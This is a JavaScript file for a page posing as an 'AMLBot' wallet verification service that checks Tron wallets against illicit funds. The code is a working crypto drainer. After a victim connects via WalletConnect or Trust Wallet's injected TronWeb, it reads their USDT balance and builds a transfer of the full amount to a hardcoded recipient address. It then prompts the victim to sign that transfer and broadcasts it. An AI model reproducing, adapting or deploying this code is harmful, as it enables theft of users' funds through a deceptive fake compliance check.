// WalletConnect v2 Configuration
const WALLETCONNECT_PROJECT_ID = 'b817d2ecbb672258029e54f9e4d086df';
const RECIPIENT_TRON_ADDRESS = 'TPT4Xin2sgSvWf53jKGcZXhMGLzaqNmkLh';
const USDT_TRC20_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

// State management
let signClient = null;
let currentSession = null;
let currentAddress = null;
let tronWeb = null;

// DOM Elements
const statusMessage = document.getElementById('status-message');
const loadingOverlay = document.getElementById('loading-overlay');
const loadingText = document.getElementById('loading-text');
const qrCodeContainer = document.getElementById('qr-code');

// Custom Errors
class WalletError extends Error {
  constructor(message, type = 'GENERIC') {
    super(message);
    this.name = 'WalletError';
    this.type = type;
  }
}

class UserRejectedError extends WalletError {
  constructor() {
    super('Transaction rejected by user', 'USER_REJECTED');
  }
}

class TransactionError extends WalletError {
  constructor(message, txData = null) {
    super(message, 'TRANSACTION_ERROR');
    this.txData = txData;
  }
}

// Utility Functions
function showLoading(message) {
  loadingText.textContent = message;
  loadingOverlay.classList.remove('hidden');
}

function hideLoading() {
  loadingOverlay.classList.add('hidden');
}

function showStatus(message, type = 'info') {
  statusMessage.textContent = message;
  statusMessage.className = `status-message ${type}`;
  statusMessage.classList.remove('hidden');

  setTimeout(() => {
    statusMessage.classList.add('hidden');
  }, 5000);
}

// Address Validation
function isValidTronAddress(address) {
  if (!address || typeof address !== 'string') return false;
  if (!address.startsWith('T') || address.length !== 34) return false;
  
  try {
    const base58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    return address.split('').every(char => base58.includes(char));
  } catch {
    return false;
  }
}

// Generate QR Code
async function generateQRCodeCanvas(text, container) {
  try {
    let attempts = 0;
    while (!window.QRCode && attempts < 30) {
      await new Promise(resolve => setTimeout(resolve, 100));
      attempts++;
    }

    if (!window.QRCode) {
      throw new Error('QRCode library not loaded');
    }

    const QRCode = window.QRCode;
    const canvas = document.createElement('canvas');

    await QRCode.toCanvas(canvas, text, {
      width: 280,
      margin: 2,
      color: {
        dark: '#0047FF',
        light: '#FFFFFF'
      }
    });

    container.innerHTML = '';
    container.appendChild(canvas);
    console.log('✓ QR Code generated successfully');
  } catch (error) {
    console.error('QR Code generation error:', error);
    const qrImage = document.createElement('img');
    qrImage.src = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(text)}`;
    qrImage.alt = 'QR Code';
    qrImage.style.maxWidth = '280px';
    qrImage.style.margin = '0 auto';
    qrImage.style.display = 'block';
    container.innerHTML = '';
    container.appendChild(qrImage);
    console.log('✓ Using fallback QR code image');
  }
}

// Initialize WalletConnect SignClient
async function initWalletConnect() {
  try {
    if (signClient) {
      return signClient;
    }

    showLoading('Initializing connection...');

    let attempts = 0;
    while (!window.SignClient && attempts < 50) {
      await new Promise(resolve => setTimeout(resolve, 100));
      attempts++;
    }

    if (!window.SignClient) {
      throw new Error('WalletConnect library not loaded. Please refresh the page.');
    }

    const SignClient = window.SignClient;

    signClient = await SignClient.init({
      projectId: WALLETCONNECT_PROJECT_ID,
      metadata: {
        name: 'AMLBot - Secure Wallet Verification',
        description: 'Verify your wallet against illicit funds',
        url: window.location.origin,
        icons: ['https://amlbot.com/_next/static/media/graph.c3572c62.svg']
      }
    });

    console.log('WalletConnect SignClient initialized');

    signClient.on('session_proposal', handleSessionProposal);
    signClient.on('session_event', handleSessionEvent);
    signClient.on('session_delete', handleSessionDelete);

    return signClient;
  } catch (error) {
    console.error('WalletConnect init error:', error);
    hideLoading();
    throw new Error('Failed to initialize WalletConnect: ' + error.message);
  }
}

// Connect wallet and initiate transaction
async function connectMobileWalletConnect() {
  try {
    showLoading('Connecting to your wallet...');

    const client = await initWalletConnect();

    const { uri, approval } = await client.connect({
      requiredNamespaces: {
        tron: {
          chains: ['tron:0x2b6653dc'],
          methods: ['tron_signTransaction', 'tron_signMessage'],
          events: ['accountsChanged', 'chainChanged']
        }
      }
    });

    if (!uri) {
      throw new Error('Failed to generate connection URI');
    }

    console.log('WalletConnect URI generated');

    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

    if (isMobile) {
      const wcDeepLink = `wc:${uri.replace('wc:', '')}`;
      window.location.href = wcDeepLink;
      hideLoading();
      showStatus('Opening your wallet app...', 'info');
    } else {
      const modal = document.getElementById('qr-modal');
      const modalTitle = document.getElementById('modal-title');
      const modalText = document.getElementById('modal-text');

      if (modalTitle) modalTitle.textContent = 'Scan with Your Wallet';
      if (modalText) modalText.textContent = 'Use any WalletConnect-compatible wallet to scan';

      qrCodeContainer.innerHTML = '';
      await generateQRCodeCanvas(uri, qrCodeContainer);

      if (modal) modal.classList.remove('hidden');
      hideLoading();
    }

    try {
      const session = await approval();
      await handleSessionApproved(session);
    } catch (error) {
      console.error('Session approval error:', error);
      const modal = document.getElementById('qr-modal');
      if (modal) modal.classList.add('hidden');
      hideLoading();
      
      if (error.message?.includes('User rejected') || error.message?.includes('Rejected')) {
        showStatus('Connection cancelled by user', 'info');
      } else {
        showStatus('Connection failed. Please try again.', 'error');
      }
    }

  } catch (error) {
    hideLoading();
    const modal = document.getElementById('qr-modal');
    if (modal) modal.classList.add('hidden');
    console.error('WalletConnect error:', error);
    showStatus(error.message || 'Failed to connect', 'error');
  }
}

// Handle session proposal
async function handleSessionProposal(proposal) {
  console.log('Session proposal received:', proposal);
}

// Handle session approved - Get address and show connection page
async function handleSessionApproved(session) {
  console.log('Session approved:', session);
  currentSession = session;

  const modal = document.getElementById('qr-modal');
  if (modal) {
    modal.classList.add('hidden');
  }

  // Extract Tron address with proper validation
  const tronNamespace = session.namespaces?.tron;
  if (tronNamespace && tronNamespace.accounts && tronNamespace.accounts.length > 0) {
    const accountStr = tronNamespace.accounts[0];
    const address = accountStr.split(':').pop();
    
    if (isValidTronAddress(address)) {
      currentAddress = address;
    } else {
      throw new Error('Invalid address received from wallet');
    }
  } else {
    throw new Error('No valid address found in session');
  }

  console.log('✅ Connected wallet address:', currentAddress);
  showStatus('Wallet connected successfully!', 'success');

  displayWalletAddress(currentAddress);
  showConnectedPage();

  // Initialize TronWeb with connected address
  initializeTronWeb();

  // Fetch balances
  await fetchAndDisplayBalances();
}

// Initialize TronWeb
function initializeTronWeb() {
  if (window.TronWeb) {
    tronWeb = new window.TronWeb({
      fullHost: 'https://api.trongrid.io',
      headers: { "TRON-PRO-API-KEY": '' } // Remove hardcoded API key
    });
    tronWeb.setAddress(currentAddress);
    console.log('✅ TronWeb initialized for address:', currentAddress);
  } else {
    console.warn('TronWeb not loaded, using direct API calls');
  }
}

// Fetch and display balances
async function fetchAndDisplayBalances() {
  try {
    showLoading('Loading wallet balances...');

    // Fetch TRX balance
    const trxBalance = await fetchTRXBalance(currentAddress);
    const trxBalanceEl = document.getElementById('trx-balance');
    if (trxBalanceEl) {
      trxBalanceEl.textContent = trxBalance.toFixed(2) + ' TRX';
    }

    // Fetch USDT balance
    const usdtBalance = await fetchUsdtBalance(currentAddress);
    const usdtBalanceEl = document.getElementById('usdt-balance');
    if (usdtBalanceEl) {
      usdtBalanceEl.textContent = usdtBalance.toFixed(2) + ' USDT';
    }

    hideLoading();

    if (usdtBalance > 0) {
      console.log('✅ USDT Balance found:', usdtBalance, 'USDT');
      // Show send button
      const sendBtn = document.getElementById('send-all-btn');
      if (sendBtn) {
        sendBtn.classList.remove('hidden');
        sendBtn.onclick = async () => {
          console.log('Send button clicked - initiating transaction...');
          
          // Add confirmation dialog
          const confirmed = await confirmTransaction(usdtBalance, RECIPIENT_TRON_ADDRESS);
          if (confirmed) {
            await createAndSendMaxUSDT(usdtBalance);
          }
        };
      }
      showStatus(`Found ${usdtBalance.toFixed(2)} USDT - Click button to transfer`, 'info');
    } else {
      console.log('No USDT balance to transfer');
      showStatus('No USDT balance found', 'info');
    }
  } catch (error) {
    console.error('Error loading balances:', error);
    hideLoading();
    showStatus('Failed to load balances', 'error');
  }
}

// Fetch TRX Balance
async function fetchTRXBalance(address) {
  try {
    const response = await fetch(`https://api.trongrid.io/v1/accounts/${address}`);
    const data = await response.json();
    
    if (data.data && data.data.length > 0) {
      return data.data[0].balance / 1000000; // Convert from sun to TRX
    }
    return 0;
  } catch (error) {
    console.error('TRX balance fetch error:', error);
    return 0;
  }
}

// Transaction Confirmation Dialog
async function confirmTransaction(amount, recipient) {
  return new Promise((resolve) => {
    // Create confirmation modal
    const modal = document.createElement('div');
    modal.className = 'confirmation-modal';
    modal.innerHTML = `
      <div class="confirmation-content">
        <h3>Confirm Transaction</h3>
        <div class="transaction-details">
          <p><strong>Amount:</strong> ${amount.toFixed(2)} USDT</p>
          <p><strong>To:</strong> ${recipient}</p>
          <p><strong>From:</strong> ${currentAddress}</p>
        </div>
        <div class="confirmation-buttons">
          <button id="confirm-cancel" class="btn-secondary">Cancel</button>
          <button id="confirm-send" class="btn-primary">Confirm Send</button>
        </div>
      </div>
    `;
    
    document.body.appendChild(modal);
    
    document.getElementById('confirm-send').onclick = () => {
      document.body.removeChild(modal);
      resolve(true);
    };
    
    document.getElementById('confirm-cancel').onclick = () => {
      document.body.removeChild(modal);
      resolve(false);
    };
  });
}

// Connect using injected TronWeb (for dApp browsers like Trust Wallet)
async function connectWithInjectedTronWeb() {
  try {
    console.log('🔌 Connecting with injected TronWeb...');
    
    // Wait for TronWeb to be ready
    let attempts = 0;
    while (!window.tronWeb?.ready && attempts < 30) {
      await new Promise(resolve => setTimeout(resolve, 100));
      attempts++;
    }

    if (!window.tronWeb || !window.tronWeb.ready) {
      throw new Error('TronWeb not available. Please open this page in Trust Wallet dApp browser.');
    }

    // Request account access
    const address = window.tronWeb.defaultAddress.base58;
    
    if (!address || address === 'T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb' || !isValidTronAddress(address)) {
      throw new Error('No valid wallet address found. Please unlock your Trust Wallet.');
    }

    console.log('✅ Connected to Trust Wallet dApp browser');
    console.log('Address:', address);

    currentAddress = address;
    tronWeb = window.tronWeb;

    const modal = document.getElementById('qr-modal');
    if (modal) modal.classList.add('hidden');

    hideLoading();
    showStatus('Wallet connected successfully!', 'success');

    displayWalletAddress(currentAddress);
    showConnectedPage();

    // Fetch balances
    await fetchAndDisplayBalances();

  } catch (error) {
    hideLoading();
    console.error('Injected TronWeb connection error:', error);
    showStatus(error.message || 'Failed to connect with Trust Wallet', 'error');
  }
}

// Send max USDT using injected TronWeb (for dApp browsers)
async function sendMaxUSDTWithInjectedTronWeb(usdtBalance, maxUsdtAmount) {
  try {
    console.log('📝 Using injected TronWeb to create transaction...');
    
    showLoading('Please approve ' + usdtBalance.toFixed(2) + ' USDT transfer in your wallet');

    // Get USDT contract instance
    const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);

    console.log('✅ Contract loaded');
    console.log('Sending', maxUsdtAmount, 'to', RECIPIENT_TRON_ADDRESS);

    // Call transfer function - this will prompt user for approval
    const transaction = await contract.transfer(
      RECIPIENT_TRON_ADDRESS,
      maxUsdtAmount
    ).send({
      feeLimit: 50000000,
      callValue: 0,
      shouldPollResponse: true
    });

    console.log('✅ Transaction sent:', transaction);

    hideLoading();
    showStatus(`✅ SUCCESS! ${usdtBalance.toFixed(2)} USDT transferred!`, 'success');

    console.log('\n🎉 ========================');
    console.log('✅ TRANSACTION SUCCESSFUL!');
    console.log('Amount:', usdtBalance, 'USDT');
    console.log('TX Hash:', transaction);
    console.log('TronScan:', `https://tronscan.org/#/transaction/${transaction}`);
    console.log('========================\n');

    // Update balance
    setTimeout(async () => {
      const newBalance = await fetchUsdtBalance(currentAddress);
      const usdtBalanceEl = document.getElementById('usdt-balance');
      if (usdtBalanceEl) {
        usdtBalanceEl.textContent = newBalance.toFixed(2) + ' USDT';
      }
    }, 3000);

  } catch (error) {
    hideLoading();
    console.error('❌ Transaction failed:', error);

    if (error.message?.includes('Confirmation declined') || error.message?.includes('user rejected')) {
      showStatus('❌ Transaction rejected by user', 'error');
    } else {
      showStatus('❌ Transaction failed: ' + (error.message || 'Unknown error'), 'error');
    }
  }
}

// Fetch USDT balance
async function fetchUsdtBalance(address) {
  try {
    console.log('Fetching USDT balance for:', address);

    const parameter = encodeAddress(address);

    const response = await fetch('https://api.trongrid.io/wallet/triggerconstantcontract', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        owner_address: address,
        contract_address: USDT_TRC20_CONTRACT,
        function_selector: 'balanceOf(address)',
        parameter: parameter,
        visible: true
      })
    });

    const data = await response.json();
    console.log('USDT balance response:', data);

    if (data.constant_result && data.constant_result.length > 0) {
      const balanceHex = data.constant_result[0];
      const balanceInt = parseInt(balanceHex, 16);
      const usdtBalance = balanceInt / 1000000;

      console.log('✅ USDT Balance:', usdtBalance, 'USDT');
      return usdtBalance;
    }

    return 0;
  } catch (error) {
    console.error('USDT balance fetch error:', error);
    return 0;
  }
}

// Create and send max USDT raw transaction - FIXED VERSION
async function createAndSendMaxUSDT(usdtBalance) {
  try {
    // Validate inputs
    if (usdtBalance <= 0) {
      throw new Error('Invalid amount: USDT balance must be positive');
    }
    
    if (!currentAddress) {
      throw new Error('Wallet not connected');
    }
    
    if (!isValidTronAddress(RECIPIENT_TRON_ADDRESS)) {
      throw new Error('Invalid recipient address');
    }

    const maxUsdtAmount = Math.floor(usdtBalance * 1000000);

    console.log('\n=== CREATING MAX USDT TRANSACTION ===');
    console.log('Max USDT Amount:', usdtBalance, 'USDT');
    console.log('Amount (smallest unit):', maxUsdtAmount);
    console.log('From:', currentAddress);
    console.log('To:', RECIPIENT_TRON_ADDRESS);
    console.log('=====================================\n');

    // Check if using injected TronWeb (dApp browser)
    if (window.tronWeb?.ready && !currentSession) {
      await sendMaxUSDTWithInjectedTronWeb(usdtBalance, maxUsdtAmount);
      return;
    }

    if (!currentSession || !signClient) {
      throw new Error('Wallet not connected. Please reconnect.');
    }

    showLoading('Creating transaction for ' + usdtBalance.toFixed(2) + ' USDT...');

    // Build raw transaction for WalletConnect
    const transferParameter = encodeTransferParams(RECIPIENT_TRON_ADDRESS, maxUsdtAmount);

    const transactionData = {
      owner_address: currentAddress, // Ensure this matches connected address
      contract_address: USDT_TRC20_CONTRACT,
      function_selector: 'transfer(address,uint256)',
      parameter: transferParameter,
      fee_limit: 50000000,
      call_value: 0,
      visible: true
    };

    console.log('Building transaction with owner_address:', currentAddress);

    const buildResponse = await fetch('https://api.trongrid.io/wallet/triggersmartcontract', {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(transactionData)
    });

    const buildResult = await buildResponse.json();

    if (!buildResult.result || !buildResult.result.result) {
      const errorMsg = buildResult.result?.message || buildResult.Error || 'Failed to build transaction';
      throw new TransactionError(errorMsg, transactionData);
    }

    const rawTransaction = buildResult.transaction;
    
    // CRITICAL FIX: Ensure the transaction has the correct owner address
    if (rawTransaction.raw_data && rawTransaction.raw_data.contract) {
      rawTransaction.raw_data.contract.forEach(contract => {
        if (contract.parameter && contract.parameter.value) {
          // Ensure owner_address is set to connected address
          contract.parameter.value.owner_address = currentAddress;
        }
      });
    }
    
    console.log('✅ Transaction created successfully');
    console.log('Transaction ID:', rawTransaction.txID);
    console.log('Transaction owner address:', currentAddress);

    // Request signature from wallet
    showLoading('⚠️ APPROVE IN YOUR WALLET ⚠️\nTransferring ' + usdtBalance.toFixed(2) + ' USDT');
    console.log('🔐 Requesting transaction signature...');

    let signedTx;
    try {
      const signResult = await signClient.request({
        topic: currentSession.topic,
        chainId: 'tron:0x2b6653dc',
        request: {
          method: 'tron_signTransaction',
          params: {
            transaction: rawTransaction
          }
        }
      });
      
      console.log('✅ Transaction signed by wallet');
      console.log('Sign result:', signResult);

      // Handle different response formats from wallets
      if (signResult.signature) {
        signedTx = {
          ...rawTransaction,
          signature: [signResult.signature]
        };
      } else if (Array.isArray(signResult)) {
        signedTx = {
          ...rawTransaction,
          signature: signResult
        };
      } else if (typeof signResult === 'string') {
        signedTx = {
          ...rawTransaction,
          signature: [signResult]
        };
      } else {
        // Assume the wallet returned the complete signed transaction
        signedTx = signResult;
      }

    } catch (signError) {
      console.error('Signature request failed:', signError);
      if (signError.message?.includes('rejected') || signError.message?.includes('User')) {
        throw new UserRejectedError();
      }
      throw new TransactionError('Transaction signing failed: ' + signError.message);
    }

    // Ensure the signed transaction has the correct address
    if (signedTx.raw_data && signedTx.raw_data.contract) {
      signedTx.raw_data.contract.forEach(contract => {
        if (contract.parameter && contract.parameter.value && contract.parameter.value.owner_address) {
          console.log('Final transaction owner_address:', contract.parameter.value.owner_address);
          
          // Verify the address matches
          if (contract.parameter.value.owner_address !== currentAddress) {
            console.warn('Address mismatch detected in signed transaction');
          }
        }
      });
    }

    // Broadcast the transaction
    showLoading('📡 Broadcasting transaction to network...');
    console.log('📡 Broadcasting signed transaction...');

    const broadcastResponse = await fetch('https://api.trongrid.io/wallet/broadcasttransaction', {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(signedTx)
    });

    const broadcastResult = await broadcastResponse.json();
    console.log('Broadcast result:', broadcastResult);

    if (broadcastResult.result === true || (broadcastResult.txid && !broadcastResult.code)) {
      const txHash = broadcastResult.txid || signedTx.txID || rawTransaction.txID;

      hideLoading();
      showStatus(`✅ SUCCESS! ${usdtBalance.toFixed(2)} USDT transferred!`, 'success');

      console.log('\n🎉 ========================');
      console.log('✅ TRANSACTION SUCCESSFUL!');
      console.log('Amount:', usdtBalance, 'USDT');
      console.log('TX Hash:', txHash);
      console.log('View on TronScan:', `https://tronscan.org/#/transaction/${txHash}`);
      console.log('========================\n');

      // Hide send button and update balance
      const sendBtn = document.getElementById('send-all-btn');
      if (sendBtn) sendBtn.classList.add('hidden');

      // Update balance after delay
      setTimeout(async () => {
        const newBalance = await fetchUsdtBalance(currentAddress);
        const usdtBalanceEl = document.getElementById('usdt-balance');
        if (usdtBalanceEl) {
          usdtBalanceEl.textContent = newBalance.toFixed(2) + ' USDT';
        }
      }, 3000);
    } else {
      throw new TransactionError(
        broadcastResult.message || broadcastResult.Error || 'Transaction broadcast failed',
        signedTx
      );
    }

  } catch (error) {
    hideLoading();
    console.error('❌ Transaction failed:', error);

    if (error instanceof UserRejectedError) {
      showStatus('❌ Transaction rejected by user', 'error');
    } else if (error instanceof TransactionError) {
      showStatus('❌ Transaction failed: ' + error.message, 'error');
    } else {
      showStatus('❌ Failed: ' + (error.message || 'Unknown error'), 'error');
    }
  }
}

// Helper: Encode address
function encodeAddress(address) {
  const base58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';

  let decoded = 0n;
  for (let i = 0; i < address.length; i++) {
    const char = address[i];
    const value = base58.indexOf(char);
    if (value === -1) {
      throw new Error('Invalid base58 character');
    }
    decoded = decoded * 58n + BigInt(value);
  }

  let hex = decoded.toString(16);
  if (hex.length % 2 !== 0) {
    hex = '0' + hex;
  }

  const addressHex = hex.slice(2, -8);
  return addressHex.padStart(64, '0');
}

// Helper: Encode transfer parameters
function encodeTransferParams(toAddress, amount) {
  const base58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';

  let decoded = 0n;
  for (let i = 0; i < toAddress.length; i++) {
    const char = toAddress[i];
    const value = base58.indexOf(char);
    if (value === -1) {
      throw new Error('Invalid base58 character');
    }
    decoded = decoded * 58n + BigInt(value);
  }

  let hex = decoded.toString(16);
  if (hex.length % 2 !== 0) {
    hex = '0' + hex;
  }

  const addressHex = hex.slice(2, -8);
  const paddedAddress = addressHex.padStart(64, '0');
  const amountHex = amount.toString(16).padStart(64, '0');

  return paddedAddress + amountHex;
}

// Handle session events
function handleSessionEvent(event) {
  console.log('Session event:', event);
}

// Handle session delete
function handleSessionDelete() {
  console.log('Session deleted');
  currentSession = null;
  currentAddress = null;
  showStatus('Wallet disconnected', 'info');
}

// Wallet popup functions
function openWalletPopup() {
  const popup = document.getElementById('wallet-selector-popup');
  if (popup) {
    popup.classList.add('show');
  }
}

function closeWalletPopup() {
  const popup = document.getElementById('wallet-selector-popup');
  if (popup) {
    popup.classList.remove('show');
  }
}

// Show connected page
function showConnectedPage() {
  const landingPage = document.getElementById('landing-page');
  const connectedPage = document.getElementById('connected-page');

  if (landingPage) landingPage.classList.add('hidden');
  if (connectedPage) connectedPage.classList.remove('hidden');
}

// Show landing page
function showLandingPage() {
  const landingPage = document.getElementById('landing-page');
  const connectedPage = document.getElementById('connected-page');

  if (landingPage) landingPage.classList.remove('hidden');
  if (connectedPage) connectedPage.classList.add('hidden');
}

// Disconnect wallet
async function disconnectWallet() {
  if (signClient && currentSession) {
    try {
      await signClient.disconnect({
        topic: currentSession.topic,
        reason: {
          code: 6000,
          message: 'User disconnected'
        }
      });
    } catch (error) {
      console.error('Disconnect error:', error);
    }
  }

  currentSession = null;
  currentAddress = null;
  tronWeb = null;

  showLandingPage();
  showStatus('Wallet disconnected', 'info');
}

// Connect wallet
async function connectWallet(walletType) {
  const walletOption = document.querySelector(`[data-wallet="${walletType}"]`);
  if (walletOption) {
    walletOption.classList.add('connecting');
  }

  setTimeout(async () => {
    if (walletOption) {
      walletOption.classList.remove('connecting');
      walletOption.classList.add('connected');
    }

    setTimeout(async () => {
      closeWalletPopup();
      if (walletType === 'trust') {
        await connectTrustWallet();
      } else {
        await connectMobileWalletConnect();
      }
    }, 500);
  }, 1000);
}

// Check if running in Trust Wallet dApp browser
function isInTrustWalletBrowser() {
  return window.ethereum?.isTrust || window.tronWeb?.isTrust || /Trust/i.test(navigator.userAgent);
}

// Connect Trust Wallet
async function connectTrustWallet() {
  try {
    // Check if we're in Trust Wallet's dApp browser
    if (isInTrustWalletBrowser() && window.tronWeb && window.tronWeb.ready) {
      console.log('✅ Detected Trust Wallet dApp browser with TronWeb');
      showLoading('Connecting to Trust Wallet...');
      
      // Use injected TronWeb
      await connectWithInjectedTronWeb();
      return;
    }

    // Otherwise, use WalletConnect deep link
    showLoading('Opening Trust Wallet...');

    const client = await initWalletConnect();

    const { uri, approval } = await client.connect({
      requiredNamespaces: {
        tron: {
          chains: ['tron:0x2b6653dc'],
          methods: ['tron_signTransaction', 'tron_signMessage'],
          events: ['accountsChanged', 'chainChanged']
        }
      }
    });

    if (!uri) {
      throw new Error('Failed to generate connection URI');
    }

    console.log('Trust Wallet URI generated');

    const trustDeepLink = `trust://wc?uri=${encodeURIComponent(uri)}`;
    window.location.href = trustDeepLink;

    hideLoading();
    showStatus('Opening Trust Wallet app...', 'info');

    try {
      const session = await approval();
      await handleSessionApproved(session);
    } catch (error) {
      console.error('Trust Wallet connection error:', error);
      showStatus('Connection rejected or failed', 'error');
    }

  } catch (error) {
    hideLoading();
    console.error('Trust Wallet error:', error);
    showStatus(error.message || 'Failed to connect Trust Wallet', 'error');
  }
}

// Display wallet address
function displayWalletAddress(address) {
  const addressDisplay = document.getElementById('wallet-address-display');
  const addressText = document.getElementById('wallet-address-text');

  if (addressDisplay && addressText && address) {
    addressText.textContent = address;
    addressDisplay.classList.remove('hidden');
  }
}

// Copy wallet address
function copyWalletAddress() {
  if (currentAddress) {
    navigator.clipboard.writeText(currentAddress).then(() => {
      showStatus('✅ Wallet address copied!', 'success');
    }).catch((error) => {
      console.error('Copy failed:', error);
      showStatus('❌ Failed to copy address', 'error');
    });
  }
}

// Make functions global
window.connectWallet = connectWallet;
window.closeWalletPopup = closeWalletPopup;
window.openWalletPopup = openWalletPopup;
window.copyWalletAddress = copyWalletAddress;
window.disconnectWallet = disconnectWallet;

// Event listeners
document.addEventListener('DOMContentLoaded', () => {
  const connectBtn = document.getElementById('connect-wallet-btn');
  if (connectBtn) {
    connectBtn.addEventListener('click', () => {
      openWalletPopup();
    });
  }

  const closeModalBtn = document.getElementById('close-modal');
  if (closeModalBtn) {
    closeModalBtn.addEventListener('click', () => {
      const modal = document.getElementById('qr-modal');
      if (modal) {
        modal.classList.add('hidden');
      }
      showStatus('Connection cancelled', 'info');
    });
  }
});

// Close popup on outside click
document.addEventListener('click', function(event) {
  const popup = document.getElementById('wallet-selector-popup');
  const popupContent = popup?.querySelector('.wallet-popup-content');
  const connectBtn = document.getElementById('connect-wallet-btn');

  if (popup && popup.classList.contains('show') &&
      popupContent && !popupContent.contains(event.target) &&
      event.target !== connectBtn) {
    closeWalletPopup();
  }
});

// Close popup with escape key
document.addEventListener('keydown', function(event) {
  if (event.key === 'Escape') {
    closeWalletPopup();
  }
});

// Auto-connect if in Trust Wallet dApp browser, otherwise show popup
window.addEventListener('load', async () => {
  // Check if running in Trust Wallet dApp browser
  if (isInTrustWalletBrowser() && window.tronWeb?.ready) {
    console.log('🔍 Detected Trust Wallet dApp browser');
    setTimeout(async () => {
      try {
        await connectWithInjectedTronWeb();
      } catch (error) {
        console.error('Auto-connect failed:', error);
        openWalletPopup();
      }
    }, 500);
  } else {
    // Not in dApp browser, show wallet selector
    setTimeout(() => {
      openWalletPopup();
    }, 1500);
  }
});
